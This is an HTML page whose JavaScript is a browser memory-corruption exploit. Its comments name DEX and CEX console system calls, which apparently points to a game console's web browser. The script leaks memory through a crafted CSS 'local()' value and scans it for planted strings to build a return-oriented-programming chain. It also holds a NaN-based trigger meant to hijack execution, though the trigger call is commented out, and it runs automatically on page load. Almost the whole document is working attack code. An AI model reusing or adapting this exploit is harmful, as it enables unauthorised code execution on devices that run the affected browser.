<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		while (1)
		{
			var search_base = 0x80200000;
			var search_size = 0x0027500;
			
			var dat = readMemory(search_base, search_size);
			
			// move past "local("
			dat = dat.substr(6, search_size);
			
			// loop for tag
			for (var i = 0; i < (search_size*2); i += 0x10)
			//for (var i = 0; i < (20000*0x10); i += 0x10)
			{
				if (i > 20000*0x10) {return 0;}
				if (dat.charCodeAt(i/2) == pattern)
				{
					var match = 0;
					
					// loop next 5 bits
					for (var k = 0; k < len; k+=2)
					{
						// convert to string
						if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
						{
							break;
						}
						// increment match
						match += 2;
					}
					
					// we got a complete match
					if (match == len)
					{
						// hold exploit addr
						var exploit_addr = search_base + i + 2;
						
						// display the exploit address
						dbg("Found " + name + " at: " + exploit_addr.toString(16));
						//dbg("Loop: "+(i/0x10));
						dat=null;
						return exploit_addr;
					}
				}
			}
			dat=null;			
		}
		dbg("string var could not be located in search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,jump_2,jump_1,j1,j2;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		dbg("Processing gadget string.. Searching for valid offset....");			
		do{
		
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// Working, well it does the syscalls
		//gadget =  unescape("\u7E2F\u000C\u6740\u7E2F"); //  sys_sm_shutdown 
		//gadget =  unescape("\u7E2F\u0061\u04E0\u7E2F"); //  sys_process_exit 
		
		gadget =  unescape("\u7E2F\u0042\uDD9C\u7E2F"); //   
		
		
		gadget_addr = findExploit("gadget",gadget,0x7E2F,0x4);
		}
		while(gadget_addr==0);
		
		dbg("Processing jump_2 string.. Searching for valid offset....");	
		do{
		jump_2 = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u2A2F");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		dbg("Processing jump_1 string.. Searching for valid offset....");
		do{
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));
		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		//dbg("gadget: "+a2hexnull(gadget));
		dbg("gadget: "+a2hex(gadget));
		dbg("gadget variable offset: "+gadget_addr.toString(16));
		//dbg("jump_2: "+a2hexnull(j2));
		dbg("gadget: "+a2hex(j2));
		dbg("jump_2 variable offset: "+jump_2_addr.toString(16));
		//dbg("jump_1: "+a2hexnull(j1));
		dbg("gadget: "+a2hex(j1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		
		//setCookie("gadget: ", a2hex(gadget));
		//getCookie();
		//setCookie("gadget_variable_offset: ", gadget_addr.toString(16));
		//getCookie();
		//setCookie("jump_1_addr: ", jump_1_addr.toString(16));
		//getCookie();
		//setCookie("jump_2_addr: ", jump_2_addr.toString(16));
		//getCookie();
		//setCookie("gadget: ", a2hex(gadget), "\ngadget_variable_offset: ", gadget_addr.toString(16), "\njump_1_addr: ", jump_1_addr.toString(16), "\njump_2_addr: ", jump_2_addr.toString(16));
		//setCookie(a2hex(gadget) + "," + gadget_addr.toString(16) + "," +  jump_1_addr.toString(16) + "," +  jump_2_addr.toString(16));
		
		// Stores here in memory DEX: 
		// 0x800CFBF0 / 0x801DFD48 / 0x801D5578 / 0x8017E2B0 / 0x801B4F1F / 0x807F3498
		// unicode: 0x8017C960 / unicode: 0x8017B010 / unicode: 0x8017AFF5 / unicode: 0x801B35D5 / 
		//setCookie("D4T__C00K13___");
		setCookie("0042dd9c");
		//getCookie(); 
		
		//trigger(jump_1_addr);		
		return;
	} catch(e) {
		dbg(e);
	}
}

/*
function setCookie(nameGadget, addrGadget, nameGadgetVariable, addrGadgetVariable, nameJump1, addrJump1, nameJump2, addrJump2){
    document.cookie = nameGadget + addrGadget + nameGadgetVariable + addrGadgetVariable + nameJump1 + addrJump1 + nameJump2 + addrJump2;
}
*/

function setCookie(value){
    document.cookie = value;
}

function getCookie(){
    alert(document.cookie);
}


</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears, reload page because exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
